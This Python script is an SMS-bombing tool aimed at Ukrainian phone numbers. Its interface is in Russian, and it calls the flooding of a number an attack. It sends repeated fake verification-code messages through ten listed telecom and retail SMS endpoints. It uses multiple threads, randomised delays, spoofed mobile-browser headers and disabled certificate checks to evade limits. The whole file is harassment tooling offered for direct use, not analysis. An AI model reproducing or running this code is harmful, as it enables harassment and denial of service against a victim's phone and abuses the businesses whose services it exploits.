import requests
import time
import threading
import random

class SMSBomber:
    def __init__(self):
        self.services = {
            'ukr_telecom': 'https://www.ukrtelecom.ua/api/sms/send',
            'kyivstar': 'https://api.kyivstar.ua/sms/send',
            'lifecell': 'https://www.lifecell.ua/api/sms/verification',
            'vodafone': 'https://www.vodafone.ua/api/sms/send',
            'nova_poshta': 'https://api.novaposhta.ua/sms/send',
            'rozetka': 'https://api.rozetka.com.ua/sms/verification',
            'olx': 'https://www.olx.ua/api/sms/send',
            'prom': 'https://prom.ua/api/sms/send',
            'allo': 'https://allo.ua/api/sms/send',
            'fozzys': 'https://fozzys.ua/api/sms/send'
        }
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'uk-UA,uk;q=0.9,ru;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://www.ukrtelecom.ua',
            'Referer': 'https://www.ukrtelecom.ua/'
        }

    def generate_random_text(self):
        texts = [
            "Ваш код подтверждения: 123456",
            "Перевірочний код: 654321", 
            "Код верифікації: 789012",
            "Підтвердження номеру: 345678",
            "Ваш код: 901234",
            "Verification code: 567890",
            "Код підтвердження: 112233",
            "Ваш пароль: 445566",
            "Код активації: 778899",
            "Підтвердьте номер: 990011"
        ]
        return random.choice(texts)

    def send_sms(self, phone, service, count):
        for i in range(count):
            try:
                # Форматируем номер для Украины
                formatted_phone = phone.replace('+', '').replace(' ', '')
                if formatted_phone.startswith('380'):
                    formatted_phone = formatted_phone
                elif formatted_phone.startswith('0'):
                    formatted_phone = '38' + formatted_phone
                else:
                    formatted_phone = '380' + formatted_phone[-9:]
                
                payload = {
                    'phone': formatted_phone,
                    'message': self.generate_random_text(),
                    'type': 'verification',
                    'sender': 'Service',
                    'language': 'uk'
                }
                
                # Добавляем случайную задержку между запросами
                time.sleep(random.uniform(0.5, 2.0))
                
                response = requests.post(
                    self.services[service],
                    json=payload,
                    headers=self.headers,
                    timeout=15,
                    verify=False
                )
                
                if response.status_code in [200, 201, 202]:
                    print(f"[✓] {service} - SMS {i+1} успешно отправлено на {formatted_phone}")
                else:
                    print(f"[✗] {service} - Ошибка {response.status_code}: {response.text}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] {service} - Сетевая ошибка: {str(e)}")
            except Exception as e:
                print(f"[!] {service} - Неожиданная ошибка: {str(e)}")

    def start_attack(self, phone, threads=3, count_per_service=5):
        print(f"[*] Начало атаки на номер: {phone}")
        print(f"[*] Количество потоков: {threads}")
        print(f"[*] Сообщений на сервис: {count_per_service}")
        print(f"[*] Всего сообщений: {len(self.services) * count_per_service * threads}")
        
        thread_list = []
        
        for service in self.services:
            for _ in range(threads):
                thread = threading.Thread(
                    target=self.send_sms,
                    args=(phone, service, count_per_service)
                )
                thread_list.append(thread)
                thread.start()
                # Задержка между запуском потоков
                time.sleep(0.5)
        
        for thread in thread_list:
            thread.join()
            
        print("[*] Атака завершена")

# Дополнительные утилиты
class PhoneUtils:
    @staticmethod
    def validate_ukrainian_phone(phone):
        """Проверка и форматирование украинского номера"""
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        if len(clean_phone) == 9 and clean_phone.startswith(('50', '63', '66', '67', '68', '73', '91', '92', '93', '94', '95', '96', '97', '98', '99')):
            return '380' + clean_phone
        elif len(clean_phone) == 10 and clean_phone.startswith('0'):
            return '38' + clean_phone
        elif len(clean_phone) == 12 and clean_phone.startswith('380'):
            return clean_phone
        else:
            return None

if __name__ == "__main__":
    bomber = SMSBomber()
    phone_utils = PhoneUtils()
    
    print("=== Украинский SMS-Бомбер ===")
    phone = input("Введите номер телефона: ")
    
    # Проверка номера
    formatted_phone = phone_utils.validate_ukrainian_phone(phone)
    if not formatted_phone:
        print("[!] Неверный формат украинского номера")
        exit()
    
    print(f"[*] Форматированный номер: +{formatted_phone}")
    
    threads = int(input("Количество потоков (1-5): ") or 2)
    count = int(input("Количество сообщений на сервис (1-10): ") or 3)
    
    # Подтверждение
    confirm = input(f"Начать атаку на +{formatted_phone}? (y/n): ")
    if confirm.lower() == 'y':
        bomber.start_attack(formatted_phone, threads, count)
    else:
        print("[*] Отменено")
